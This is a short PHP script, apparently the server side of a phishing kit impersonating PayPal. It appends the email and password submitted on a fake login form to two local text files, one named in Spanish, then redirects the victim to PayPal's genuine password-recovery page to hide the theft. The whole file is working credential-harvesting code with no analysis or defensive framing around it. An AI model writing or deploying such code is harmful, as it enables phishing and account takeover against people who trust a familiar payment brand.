<?php

file_put_contents("usernames.txt", $_POST['login_email'], FILE_APPEND);
file_put_contents("contrasenas.txt", $_POST['login_password'], FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>